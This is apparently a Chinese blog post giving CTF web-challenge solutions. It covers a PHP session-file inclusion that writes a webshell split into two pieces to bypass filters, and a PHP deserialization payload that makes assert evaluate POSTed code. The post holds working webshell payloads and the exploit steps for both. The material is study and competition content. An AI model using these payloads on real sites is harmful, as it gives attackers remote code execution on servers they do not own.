只做了web，赛后要了复现环境，`ezinclude`竟然还有`dir.php` ？？
说是不能扫，不知道怎么知道有这个文件的存在，我还是太菜了，等待一个wp。



# 看源码

在url之前加上`view-source:`可以看到flag

# easyphp
php伪协议读文件 + session写入文件 + 包含session文件getshell

首先是伪协议读文件，可以读到`msg.php`中将POST的msg写入session中，有长度限制且会将`php`替换成`?`

这里php标签可以使用`<?= ?>`代替掉`<?php ?> `，长度限制可以使用`/**/`注释 + 多次写入绕过

这里我分两次写入，
第一次：`<?=$a=$_GET;/*`
第二次：`*/$a[1]($a[2]);?>`

之后再包含`/tmp/sess_{session值}`即可。

![20200422124224](https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20200422124224.png)

最后在根目录下找到flag文件

![20200422124351](https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20200422124351.png)

# ReadlezPHP

进入题目，f12可以找到`time.php?source`，进入即可获得源码

之后是简单的反序列化
```php
<?php
class HelloPhp
{
    public $a = 'eval($_POST[1]);';
    public $b = 'assert';
}
$c = new HelloPhp;
echo serialize($c);
?>
```
得到序列化的字符串
之后传入data即可getshell
![20200422125745](https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20200422125745.png)

